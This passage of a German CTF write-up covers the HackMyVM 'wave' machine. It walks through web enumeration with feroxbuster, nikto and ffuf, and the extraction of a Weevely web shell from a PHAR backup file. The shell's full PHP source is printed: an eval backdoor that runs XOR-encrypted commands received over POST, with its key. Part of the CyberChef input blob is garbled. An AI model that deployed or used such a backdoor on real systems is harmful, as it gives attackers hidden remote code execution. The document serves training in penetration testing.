+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den gefundenen PHP-Code genau, um den Verschlüsselungsmechanismus und den Schlüssel zu extrahieren. Nutzen Sie Tools wie CyberChef oder manuelle Analyse, um die kodierten Bytes nach `__HALT_COMPILER();` zu verstehen. Bereiten Sie sich darauf vor, die Shell zu aktivieren und zu nutzen, sobald der Schlüssel bekannt ist.
+                <br><strong>Empfehlung (Admin):</strong> Web-Shells sind hochgefährlich und ein Indikator für eine bereits erfolgte oder unmittelbar bevorstehende Kompromittierung. Entfernen Sie die Datei unverzüglich und analysieren Sie, wie sie auf das System gelangt ist. Überprüfen Sie das System auf weitere Backdoors oder persistente Mechanismen. Implementieren Sie File Integrity Monitoring (FIM), um das unerlaubte Platzieren von Dateien in Webverzeichnissen zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">https://cyberchef.org/#recipe=Detect_File_Type(true,true,true,true,true,true,true)&input=PD9waHAgaW5jbHVkZSAiXDE2MFx4NjhcMTQxXHg3Mlw3Mlw1N1w1NyIuYmFzZW5hbWUoX19GSUxFX18pLiJcNTdceDc4IjtfX0hBTFRfQ09NUElMRVIoKTsgPz4vXDAwXDAwXDAwXDAxXDAwXDAwXDAwXDExXDAwXDAwXDEwXDAxXDAwXDAwXDAwXDAwXDAwXDAwXDAwXDAwXDAxXDAwXDAwXDAwXDc4XEUxXDAxXDAwXDAwXDAwXDAwXDAwXDAwXDU4XDAxXDAwXDAwXDgyXDgyXENDXDk3XEZGXDExXDAwXDAwXDAwXDAwXDAwXDAwXDU1XDkwXEVGXDZBXEMyXDMwXDE0XEM1XEJGXEY3XDI5XDRBXEI4XDY4XDQyXEM1XDdGXDUzXDNCXDE3XEMzXENBXEQ4XDEzXDBDXEI2XDJGXEUyXDRBXDlCXEE2ClwxQVw2RFw5M1wyRVw4RFxDM1wyOVxCRVxGQlw2RVwxRFwxQlw4Q1w0MFxFMFxGQ1wyRVxFN1w1Q1xDRVw1RFwzRFwzNlxCQlwyNlw1NFw5Rlw1OVw0NVxGQlw3MFwxMFxFNFxBRVwyOFxDQVw3MVxDMzFcOTdcODRcQzNcNjFcMjdcNDhcQkVCXDUwXDcxXDM2XDlGXDJFXEYzXDg1XDlDXDc2XEE4XDE0XEE0XDk4XDJFXxFRXEIxXDM4XDlFXEM0XEIxXDY1XDhFXEE4XDExXDI0XDJCXxDRXEM3XDczXEZCXDIyXDlFXDlBXEI3X0ZBClwzNVw5Rlw3Q1wxMVwxRVwwNFxFNVxEMTFcNDhcQUZcQURcMDlcNEZcMTRcRkNcMDBcMEVcRUNcMTJcODBcMTRcQURcNzdcOTVcMzJcMTRcMjVcODdcRUFcNEZcNzlcNTQcNTZcMTBcQjRcOTVcRDZcNTFcRDBcNjJcQ0NcNDFcQUZcQTBcRTJcNjhcQkFcOTFcM0RcMTJcRkNcNTdcMjBcN0JcQkRcREJcMDRcMERcRkJcMjhcMUFcODBcOEVcMjJcMTZcNjBcQjJcMURcMEFcRjBcNkJcRDBcOUJcNzdcMzhcQUMcNjFcQkZcRTFcQzEKXDE1XDlGXDUzXEZFXEU4XDRDXDA4XEI2XDkzXEJBXDBDXDY5XEQyXDM4XEI1XDREXEVCXENDXENCXDFEXDI1XDIzXDJDXDQ4XDg3XDExXEMzXDUyXDIzXDMyXDQ4XDRBXDVEXEE5XDc0XEFCXDdDXDJBXEFEXEYxXENBXEY4XDk2XDEyXEJDXENDXEMzXDY4XEE0XDREXDczXEY0XDg0XDBEXEEwXDY2XDQyXDRDXDU4XDc4XDA5XDEyXDlCXEE3XEFEXENGXDlDXEE3XDgCXDA3XEM5XEVEXDc2XEM5XEY2XDgCXDg1XDZEXDhEXDBCCVxEQVw5NlwyNlwyN1w5QVxFNFw1OVxBQlwxNlxCM1xCNFw1MFxEMlwxNlw4QVw0MlxCRFw5RVw2Q1w1OFw3N1wwN1w4NlwxRVw2Q1xEQlw2NVxGQ1xEQlxENlw0NVwyMVw1M1xBNlw0OFw2NVxBNVwzMlxEM1wwMVw3MFxFMFwzNlxNDcXDk5XzVCFDRFXDk3XBCXzNE\xEF\xBF\xBD\xAD\xCD\xEF\xBF\xBD\xAD\xCF\x9C\xA7\x8C\07\xC9\xED\x76\xC9\xF6\x8C\x85\x6D\x8D\0B
+\xDA\x96\x26\x27\x9A\xE4\59\xAB\16\xB3\xB4\50\xD2\16\x8A\x42\xBD\x9E\x6C\58\77\07\x86\1E\x6C\xDB\65\xFC\xDB\xD6\45\21\53\xA6\48\x65\xA5\32\xD3\01\70\xE2\37\47\99\x5B\4E\97\xBC\x3D\xFF\x2D\02\xFB\93\xC9\x83\xC6\69\xE3\29\x81\06\5B\x81\xC3\4E\04\xE1\xB5\xCF\xF8\37\xD9\xC5\55\5F\xBD\x3D\x2A
+\12\xF1\xFE\xCE\xA8\x8F\73\x3F\63\28\28\56\10\02\00\00\00GBMB</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um absolut sicherzugehen, welchen Dateityp der Webserver intern interpretiert, auch wenn die Endung `.bck` lautet, nutzte ich das Online-Tool CyberChef und dessen "Detect File Type" Funktion. Ich fügte den Inhalt der `weevely.bck` Datei in CyberChef ein. Das Tool analysierte den Inhalt und identifizierte die Datei als PHP-Code, basierend auf den enthaltenen Signaturen und dem Strukturmuster.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Ergebnis bestätigte meine Annahme, dass die `weevely.bck` Datei trotz ihrer ungewöhnlichen Endung tatsächlich ausführbarer PHP-Code ist. Dies ist eine wichtige Erkenntnis, da es bedeutet, dass ich die Datei als PHP-Skript ansprechen muss, um die Web-Shell zu aktivieren. Die Dateityp-Erkennung war ein nützlicher Validierungsschritt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Dateityp-Erkennungstools (online oder offline), wenn Sie Dateien mit irreführenden Endungen finden. Dies hilft zu verstehen, wie die Datei vom System oder von Diensten interpretiert wird und wie sie potenziell ausgenutzt werden kann.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver so, dass sie Dateien nur basierend auf einer expliziten Liste erlaubter MIME-Typen und Endungen ausführen. Verhindern Sie die Ausführung von Skripten basierend auf Inhalts-Sniffing oder unsicheren Standardeinstellungen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">view-source:http://wave.hmv/index.html</span>
+<h3> <span class="command">WAVE</span> </h3>
+
+<!-- <span class="password">wAvE</span> -->
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Parallel zur Analyse der Backup-Dateien betrachtete ich den Quellcode der Hauptseite `index.html` mittels der Browserfunktion "view-source". Der Quellcode war sehr einfach und enthielt lediglich eine `<h3>` Überschrift mit dem Text "WAVE" und einen HTML-Kommentar `< -- wAvE -->`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Überprüfen des Quellcodes von Webseiten ist ein grundlegender Schritt bei der Web-Enumeration. Oft sind hier versteckte Hinweise, Links, Kommentare oder Informationen zu finden, die in der gerenderten Seite nicht sichtbar sind. Der Kommentar `< -- wAvE -->` ist ein möglicher Hinweis oder einfach nur ein internes Tag, der den Namen der VM wieder aufgreift. Er liefert keine direkte Schwachstelle, ist aber als Kontext interessant.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Betrachten Sie immer den Quellcode jeder Seite, die Sie besuchen. Suchen Sie gezielt nach HTML-Kommentaren, versteckten Formularfeldern, referenzierten Skripten oder ungewöhnlicher Formatierung, die auf versteckte Informationen hindeuten könnten.
+                <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensitive Informationen, interne Notizen oder potenziell verräterische Details in HTML-Kommentaren zu hinterlassen. Gehen Sie davon aus, dass jeder, der Ihre Website besucht, auch den Quellcode sehen wird.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">feroxbuster --url "http://wave.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span>
+                    </div>
+                    <pre>
+<span class="command"> ___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="command">───────────────────────────┬──────────────────────</span>
+<span class="command"> 🎯  Target Url            │ http://wave.hmv</span>
+<span class="command"> 🚀  Threads               │ 50</span>
+<span class="command"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command"> 👌  Status Codes          │ [200, 301, 302]</span>
+<span class="command"> 💥  Timeout (secs)        │ 7</span>
+<span class="command"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
+<span class="command"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+<span class="command"> 🔎  Extract Links         │ true</span>
+<span class="command"> 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+<span class="command"> 🏁  HTTP methods          │ [GET]</span>
+<span class="command"> 🔃  Recursion Depth         │ 4</span>
+<span class="command">───────────────────────────┴──────────────────────</span>
+<span class="command"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="command">──────────────────────────────────────────────────</span>
+<span class="command">200      GET        3l        5w       32c http://wave.hmv/backup/phptest.bck</span>
+<span class="command">200      GET        2l        1w        4c http://wave.hmv/backup/log.log</span>
+<span class="command">200      GET        1l        2w       18c http://wave.hmv/backup/robots.bck</span>
+<span class="command">200      GET        2l       13w      833c http://wave.hmv/backup/weevely.bck</span>
+<span class="command">200      GET        3l        6w       31c http://wave.hmv/backup/index.bck</span>
+<span class="command">200      GET        3l        6w       31c http://wave.hmv/</span>
+<span class="command">200      GET        3l        6w       31c http://wave.hmv/index.html</span>
+<span class="command">301      GET        7l       11w      169c http://wave.hmv/backup --> http://wave.hmv/backup/</span>
+<span class="command">200      GET        1l        2w       18c http://wave.hmv/robots.txt</span>
+<span class="password">200      GET        1l        2w       11c http://wave.hmv/phptest.php</span>
+<span class="command">[####################] - 7m   6175484/6175484 0s      found:10      errors:0</span>
+<span class="command">[####################] - 7m   6175288/6175288 14695/s http://wave.hmv/</span>
+<span class="command">[####################] - 0s   6175288/6175288 3087644000/s http://wave.hmv/backup/ --> Directory listing (add --scan-dir-listings to scan)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Ergänzung zu `gobuster` setzte ich `feroxbuster` ein, ein weiteres schnelles Tool für die Web-Enumeration. Ich konfigurierte es ähnlich, um das Verzeichnis `http://wave.hmv` zu durchsuchen, eine große Wordlist und eine breite Palette von Dateiendungen zu verwenden. Ich beschränkte die Ergebnisse auf Statuscodes 200, 301 und 302. Die Ausgabe bestätigte erneut die bereits gefundenen Pfade wie `/`, `/index.html`, `/robots.txt` und `/backup` (mit Umleitung). Wichtiger noch, `feroxbuster` identifizierte zusätzlich die Datei `/phptest.php`, die `gobuster` zuvor nicht gefunden hatte, wahrscheinlich aufgrund der spezifischen Konfiguration oder Dateiendungsliste.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das parallele Verwenden verschiedener Tools für die Web-Enumeration erhöht die Wahrscheinlichkeit, alle versteckten oder ungewöhnlichen Pfade und Dateien zu finden. Der Fund von `/phptest.php` ist ein neuer, wichtiger Anhaltspunkt. Das Tool bestätigte auch die Verzeichnislistung in `/backup/`, was die Ergebnisse der vorherigen Schritte konsolidiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie verschiedene Directory-Busting-Tools, da sie unterschiedliche Algorithmen, Wordlists oder Standardeinstellungen haben können, die zu unterschiedlichen Ergebnissen führen. Passen Sie die Wordlist und die Dateiendungen sorgfältig an das Zielsystem an.
+                <br><strong>Empfehlung (Admin):</strong> Kombinieren Sie Rate Limiting und Web Application Firewalls (WAF) oder ähnliche Technologien, um Brute-Force-Angriffe auf Dateinamen und Verzeichnisse zu erkennen und abzuwehren. Führen Sie regelmäßige Bereinigungen von Webservern durch, um unnötige oder vergessene Dateien zu entfernen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://wave.hmv/phptest.php</span>
+
+<span class="command">Web Server</span>
+<span class="password">Nginx 1.22.1</span>
+<span class="command">Programmiersprache</span>
+<span class="password">PHP</span>
+<span class="command">Reverse Proxies</span>
+<span class="password">Nginx 1.22.1</span>
+<span class="command">Something wrong or missing?</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich rief die neu gefundene Datei `http://wave.hmv/phptest.php` in meinem Browser auf. Die Seite zeigte eine sehr einfache Ausgabe, die lediglich bestätigte, dass der Webserver `Nginx 1.22.1` verwendet, die Programmiersprache `PHP` aktiv ist und dass Nginx auch als Reverse Proxy dient.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Seite an sich scheint keine direkte Schwachstelle zu enthalten. Ihre Hauptfunktion für mich war die Bestätigung, dass PHP auf diesem Pfad ausgeführt wird. Dies ist entscheidend für die spätere Ausnutzung der gefundenen Weevely Web-Shell, die ebenfalls PHP benötigt, um ausgeführt zu werden. Die Information über PHP ist hier also der wichtigste Aspekt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie jede gefundene Seite auf dem Zielsystem, egal wie simpel sie erscheint. Suchen Sie nach Technologie-Hinweisen, Fehlermeldungen oder anderen Informationen, die für die Angriffsplanung relevant sein könnten.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Informationen, die öffentlich auf Webseiten preisgegeben werden, insbesondere genaue Versionsnummern von Software oder Details zur Systemarchitektur (z.B. Reverse Proxies).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nikto -h http://wave.hmv/phptest.php</span>
+                    </div>
+                    <pre>
+<span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.33</span>
+<span class="command">+ Target Hostname:    wave.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-08 22:38:49 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="password">+ Server: nginx/1.22.1</span>
+<span class="password">+ /phptest.php/: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /phptest.php/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /phptest.php/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/pma/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/.tools/phpMyAdmin/current/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher. See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]</span>
+<span class="password">+ /phptest.php/openautoclassifieds/friendmail.php?listing=alert(document.domain);: OpenAutoClassifieds 1.0 is vulnerable to a XSS attack. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1145 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1145]</span>
+<span class="command">+ 7961 requests: 0 error(s) and 9 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-08 22:39:21 (GMT2) (32 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um zu prüfen, ob die `phptest.php` Seite oder das sie hostende Verzeichnis weitere Schwachstellen aufweist, ließ ich `nikto` erneut laufen, diesmal spezifisch auf die URL `http://wave.hmv/phptest.php`. Die Ausgabe war umfangreich. Nikto meldete erneut die fehlenden Sicherheits-Header. Es gab zahlreiche Warnungen bezüglich potenzieller Verzeichnislistungen in phpMyAdmin-Pfaden, die unter `/phptest.php/` gefunden wurden. Diese Pfade (`/phptest.php/phpMyAdmin/db_details_importdocsql.php` etc.) schienen jedoch sehr generisch zu sein und basierten wahrscheinlich auf Nikto-Signaturen, die auf PHP-Dateien triggern, nicht auf tatsächlich existierenden Verzeichnissen auf dieser VM (da sie bei `feroxbuster` und `gobuster` nicht auftauchten). Eine weitere Warnung betraf eine angebliche XSS-Schwachstelle in einem `OpenAutoClassifieds` Pfad, der ebenfalls nicht gefunden wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Nikto-Ausgabe enthielt viele generische oder unwahrscheinliche Treffer. Die fehlenden Sicherheits-Header sind reale Probleme, aber die phpMyAdmin- und OpenAutoClassifieds-Warnungen scheinen in diesem spezifischen Kontext nicht direkt zutreffend zu sein, da die entsprechenden Pfade nicht bei der Verzeichnis-Enumeration gefunden wurden. Dies unterstreicht, wie wichtig es ist, die Ergebnisse automatisierter Scanner kritisch zu prüfen und manuell zu verifizieren. Die primäre Erkenntnis hier war die Bestätigung, dass PHP auf diesem Pfad ausgeführt wird und die generellen Webserver-Konfigurationsprobleme (fehlende Header).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie skeptisch bei generischen Warnungen von Scannern, insbesondere wenn die gemeldeten Pfade oder Technologien nicht anderweitig bestätigt wurden. Konzentrieren Sie sich auf bestätigte Funde und nutzen Sie Scanner-Ausgaben als *Hinweise*, die weiterer Untersuchung bedürfen. Beheben Sie generische Web-Schwachstellen (wie fehlende Header) in realen Umgebungen, da sie Teil der Gesamt-Angriffsfläche sind.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihren Webserver korrekt, um alle relevanten Sicherheits-Header zu senden. Installieren Sie nur benötigte Softwarepakete und entfernen Sie Standard-Installationen von Anwendungen wie phpMyAdmin oder OpenAutoClassifieds, wenn sie nicht verwendet werden. Halten Sie die Signaturen Ihrer Sicherheitstools (wie Nikto) aktuell, aber überprüfen Sie "False Positives" und passen Sie ggf. Scan-Regeln an.
+            </p> 
+			            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">mv /home/ccat/Downloads/weevely.bck ./weevely.phar</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich den Inhalt der Datei `weevely.bck` im Browser angesehen hatte, lud ich sie auf mein Kali-System herunter. Um die Datei für die weitere Analyse vorzubereiten und speziell die Metadaten des PHP-Archivs (PHAR) zu untersuchen, benannte ich die Datei in `weevely.phar` um. Eine `.phar`-Endung kennzeichnet in PHP ein Archivformat ähnlich einem TAR oder ZIP, das auch ausführbaren Code enthalten kann.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Umbenennen der Datei auf meinem lokalen System ändert natürlich nichts an ihrem Inhalt auf dem Zielsystem oder daran, wie der Webserver sie interpretiert. Es ist ein rein organisatorischer Schritt, um mir die Arbeit mit PHP-eigenen Werkzeugen zu ermöglichen, die `.phar`-Dateien erkennen und verarbeiten können. Dies war notwendig, um den verschlüsselten Teil der Shell, der nach `__HALT_COMPILER();` liegt, zugänglich zu machen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie potenzielle ausführbare Dateien mit ungewöhnlichen Endungen finden, versuchen Sie, den tatsächlichen Dateityp zu bestimmen (z.B. mit `file` oder online Tools). Benennen Sie Dateien auf Ihrem lokalen System passend um, um sie mit den dafür vorgesehenen Tools verarbeiten zu können.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver so, dass sie keine Dateien mit potenziell gefährlichen Endungen (wie `.phar`) in Webverzeichnissen zulassen oder diese zumindest nicht als ausführbaren Code behandeln. Stellen Sie sicher, dass Dateiuploads auf erlaubte und sichere Dateitypen beschränkt sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">phar extract -f ./weevely.phar</span>
+                    </div>
+                    <pre>
+<span class="command">x ...ok</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Nächstes nutzte ich das Kommandozeilen-Werkzeug `phar` auf meinem Kali-System, um den Inhalt des `weevely.phar` Archivs zu extrahieren. Der Befehl `phar extract -f ./weevely.phar` wies das Tool an, das angegebene Archiv zu extrahieren. Die Ausgabe `x ...ok` zeigte an, dass eine Datei oder ein Verzeichnis namens `x` erfolgreich extrahiert wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> PHP Archive (PHAR) können mehrere Dateien enthalten, ähnlich wie ZIP. Der Teil des Weevely-Codes, der nach `__HALT_COMPILER();` steht, ist oft ein solches eingebettetes Archiv. Die Extraktion zeigte, dass das Haupt-Payload oder ein weiterer Teil der Shell in einer Datei namens `x` gespeichert war. Dies war der nächste logische Schritt, um an den eigentlichen verschlüsselten Shell-Code zu gelangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie PHAR-Dateien finden, untersuchen Sie deren Inhalt mit Tools wie `phar` oder durch Umbenennen in `.zip` und standardmäßige Extraktion. Diese Archive können oft interessante oder ausführbare Inhalte verstecken.
+                <br><strong>Empfehlung (Admin):</strong> Verhindern Sie das Hochladen und Ausführen von PHAR-Dateien in Webverzeichnissen, es sei denn, es ist explizit für die Anwendung erforderlich. Blockieren Sie die PHAR-Stream-Wrapper (`phar://`) in der PHP-Konfiguration, wenn sie nicht benötigt werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">cat x</span>
+                    </div>
+                    <pre>
+<span class="command">eval('$k="3ddf0d5c";$kh="b6e7a529b6c2";$kf="d598a771749b";$p="afnqDsRcBpVmU71y";
+
+function x($t,$k){
+$c=strlen($k);$l=strlen($t);$o="";
+for($i=0;$i<$l;){
+for($j=0;($j<$c&&$i<$l);$j++,$i++)
+{
+$o.=$t[$i]^$k[$j];
+}
+}
+return $o;
+}
+if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
+@ob_start();
+@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+$o=@ob_get_contents();
+@ob_end_clean();
+$r=@base64_encode(@x(@gzcompress($o),$k));
+print("$p$kh$r$kf");
+}');</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt der extrahierten Datei `x` mit `cat` angezeigt. Die Datei enthielt eine einzelne PHP-Zeile, die mit `eval('...')` begann. Innerhalb des `eval`-Aufrufs befand sich der eigentliche Kerncode der Weevely Shell. Dieser Code definierte eine Funktion `x` zur Durchführung einer XOR-Operation, einen statischen Schlüssel `$k = "3ddf0d5c"`, feste Präfixe und Suffixe (`$kh`, `$kf`, `$p`) und enthielt die Logik, um über POST-Daten empfangene, Base64-dekodierte, XOR-entschlüsselte und GZuncompress-dekomprimierte Befehle auszuführen (`eval`) und die Ausgaben entsprechend zu verarbeiten (puffern, komprimieren, XOR-verschlüsseln, Base64-kodieren) und mit den definierten Präfixen/Suffixen zurückzugeben. Dies ist genau die erwartete Funktionalität einer Weevely Web-Shell.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das war der entscheidende Schritt, um zu verstehen, wie die Web-Shell funktioniert und wie ich mit ihr kommunizieren kann. Der statische Schlüssel `"3ddf0d5c"` und die Kommunikationsprotokolle (Base64, GZ-Kompression, XOR) wurden vollständig offengelegt. Mit diesen Informationen kann ich nun eigene Payloads im richtigen Format generieren und an die Shell senden, um Befehle auf dem Zielsystem auszuführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Code von gefundenen Web-Shells immer gründlich, um den Schlüssel, das Kommunikationsprotokoll und die Art der Ausführung zu verstehen. Nutzen Sie diese Informationen, um eigene Clients oder Skripte zu erstellen, die mit der Shell interagieren können, anstatt sich auf Standard-Clients zu verlassen, falls diese nicht verfügbar sind.
+                <br><strong>Empfehlung (Admin):</strong> Das Vorhandensein von Web-Shells mit einfach extrahierbaren Schlüsseln ist ein schwerwiegendes Sicherheitsproblem. Implementieren Sie Application Code Scanning, um potenziell bösartigen Code zu erkennen. Verwenden Sie keine leicht zu erratenden oder statischen Schlüssel in verschlüsselten Kommunikationstools. Blockieren Sie die Ausführung von `eval()` mit Benutzereingaben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">echo -e "php\nphtml\nphp3\nphp4\nphp5\nphp7\nphps" > php_ext.txt</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da die `weevely.bck` Datei eine ungewöhnliche Endung hatte, aber offensichtlich als PHP ausgeführt werden musste, war es wichtig herauszufinden, welche PHP-Dateiendungen der Nginx-Webserver auf diesem System tatsächlich für die Ausführung konfiguriert hatte. Ich erstellte eine einfache Textdatei (`php_ext.txt`) mit einer Liste gängiger PHP-Dateiendungen (`php`, `phtml`, `php3`, `php4`, `php5`, `php7`, `phps`), die ich mit `echo -e` und Umleitung in die Datei schrieb.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl ich wusste, dass die `.bck` Datei PHP enthielt, musste ich wissen, unter *welcher* Endung sie auf dem Webserver angesprochen werden musste, damit Nginx sie an den PHP-Interpreter sendet. Es ist unwahrscheinlich, dass Nginx standardmäßig `.bck` als ausführbar behandelt. Diese Liste gängiger Endungen diente als Grundlage für den nächsten Test, um die korrekte URL für die Shell zu finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie Web-Shells mit ungewöhnlichen Endungen finden, führen Sie Brute-Force-Angriffe auf gängige ausführbare Endungen durch, um herauszufinden, welche vom Webserver interpretiert werden. Erstellen Sie gezielte Wordlists für solche Tests.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver so, dass sie nur explizit definierte Dateiendungen als ausführbar behandeln und andere Endungen als statischen Inhalt ausliefern. Überprüfen Sie die Handler-Mappings in der Webserver-Konfiguration (z.B. `nginx.conf`, `.htaccess` bei Apache).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">ffuf -w php_ext.txt -u http://wave.hmv/weevely.FUZZ -mc 200</span>
+                    </div>
+                    <pre>
+<span class="command">        /'___\  /'___\           /'___\       </span>
+<span class="command">       /\ \__/ /\ \__/  __  __  /\ \__/       </span>
+<span class="command">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span>
+<span class="command">        \ \ \_/ \ \ \_/\ \ \_/\ \ \ \_/      </span>
+<span class="command">         \ \_\   \ \_\  \ \____/  \ \_\       </span>
